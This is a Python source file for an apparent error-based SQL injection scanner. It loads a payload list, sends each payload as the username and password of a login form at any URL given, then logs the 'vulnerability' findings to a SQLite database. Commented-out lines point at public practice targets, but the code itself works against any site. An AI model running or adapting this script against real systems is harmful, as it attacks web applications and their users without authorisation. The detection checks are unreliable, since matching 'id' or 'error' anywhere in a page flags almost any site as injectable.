import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import inspect
import traceback
from bs4 import BeautifulSoup
import database
# from database import create_database_for_Captures
import sqlite3
import logging

init()

###################################################################
attack_type = "Error Based SQL Injection"
###################################################################
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}
logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)

###################################################################
""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""

ack = None

##################################################################
#* Creates a regex pattern
capturesERRBASED = []
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
########################################################
  
async def Error_based_inj_HEADER(urls):
    # ack = requests.post(urls)
    """This is for error based SQL injection. You can realize to the SQL structure by this Injection if it works."""
    try: 
        global pattern,htmlpattern #* Declare the lists as an global variable
        done = False #* Creates flag False for the done value
        filename = "Error_based.txt" #* This is a file that is on the same directory as the python file
        current_directory = os.path.dirname(os.path.abspath((__file__))) #* Obtain current directory
        file_path = os.path.join(current_directory, filename) #* Obtain the file path
        #! We do that because we cannot count on the initial directory path so we need the precise of it on any device

        with open(file_path, "r") as file: #* Opens the file as read mode
            payload = file.read() #* Reads the file
            rows = payload.split("\n") #* Splits the rows with \n
            sorted_rows = sorted(rows) #* Sort the lists
            sorted_payload = "\n".join(sorted_rows) #* Join the program
            print(Fore.RED + str(sorted_payload)) #* Display the payload
            requests.packages.urllib3.disable_warnings()  # *Disable SSL warnings for the practice
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the ip url: {urls}\n Do you want to send the payload to the website? ")
                logging.info(f"The host is up with the url:{urls},Time captured:{datetime.now()},Attack:{attack_type}")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = {
                            "username": line,
                            "password": line
                        }
                        
                        ##############################################################################
                        # print(line) #*  We may need that 
                        ack = requests.post(url=urls, data=params,verify=False)
                        print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type,"\n|Headers:|",headers)
                        print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found In the error based attack|:","error" in ack.text,"|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"Could found return that appeared to be injectable,Attack:{attack_type},Time:{datetime.now()}")
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                        if vuln:
                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found at the website: |", ack.text," | with the count of: |",len(vuln)if len(str(vuln)) != 0 else "|Nothing found|","|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"Could found return that appeared to be injectable,Attack:{attack_type},Time:{datetime.now()},parameter=(id=?,error)")
                            await asyncio.sleep(3)
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found Status|:", ack.text,"with the count of:",len(htmlVULN)if len(str(htmlVULN)) != 0 else "|Nothing found|","|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"Could found return that appeared to be injectable,Attack:{attack_type},Time:{datetime.now()},parameter=(id=?,error),html doc.")
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found Status In error based attack|:", "Founded!!!" if word is True else "DID NOT found.","|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"Could find a return appear to be injectable.(id),attack:{attack_type},Time:{datetime.now()}")
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", "Founded!!!" if errword is True else "Did not Found","|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"Could find a return appear to be injectable.(error),attack:{attack_type},Time:{datetime.now()}")
                            await asyncio.sleep(3)
                            
                        
                            
                    if ack.status_code == 302:
                        print(f"[{datetime.now()}]","Could find the injectable area on the website:",line,"|Attack:|",attack_type,"\n|Headers:|",headers)
                        logging.info(f"Could find the injectable area on the website,Attack:{attack_type},Time:{datetime.now()}")
                        done = True
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type,"\n|Headers:|",headers)
                        logging.info(f"Could connect to the website but did found injectable area on the website,Attack:{attack_type},Time:{datetime.now()}")
                        
                        
            else:
                print(f"[{datetime.now()}]",Fore.RED + "Looks like the host is down with the ip address: {socket.gethostbyname(url)}","|Attack:|",attack_type,"\n|Headers:|",headers)
                logging.error(f"Host {urls} is down,Time:{datetime.now()}")
                  
        conn = sqlite3.connect("SQLJresult.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]

        cur.executemany(sql, values)

        conn.commit()
        conn.close()
                    
                    
    # except Exception as e:
    #     print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Error:",e)
    #     traceback.print_exc()
        
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Error:",e,"|Attack:|",attack_type)
        logging.error(f"Connection aborted,attacktype:{attack_type},Time:{datetime.now()}")
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Error:",e,"|Attack:|",attack_type)
        logging.error(f"Connection error,attacktype:{attack_type},Time:{datetime.now()}")
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Error:",e)
        logging.error(f"Connection refused,attacktype:{attack_type},Time:{datetime.now()}")

    except ConnectionResetError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Error:",e)
        logging.error(f"Connection reset,attacktype:{attack_type},Time:{datetime.now()}")
        
    except KeyboardInterrupt:
        # print(f"[{datetime.now()}]","Exiting...")
        pass
        
        raise SystemExit
    except UnboundLocalError:
        pass
    
        

    finally:
        # pass ->
        pass
        # global ack
        # if ack is not None:
        #     print(ack.status_code)
        #     soup = BeautifulSoup(ack.content,"html.parser")
        #     with open("captures.txt",'w') as file:
        #         file.write(str(soup))
        #         file.write(str(ack.text))
            
        
        # global capturesERRBASED
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #             \n{ack.text}\n     """)
        # capturesERRBASED.append(ack.text)
        # filename = "result.txt"
        # current_directory = os.path.dirname(os.path.abspath(__file__)) #* Obtain current directory
        # file_path = os.path.join(current_directory, filename)
        # with open(filename,"w") as file:
        #     file.write(ack.text)

      
      
# if __name__ != "main":
#     pass                      
# asyncio.run(Error_based_inj("http://testfire.net/login.jsp"))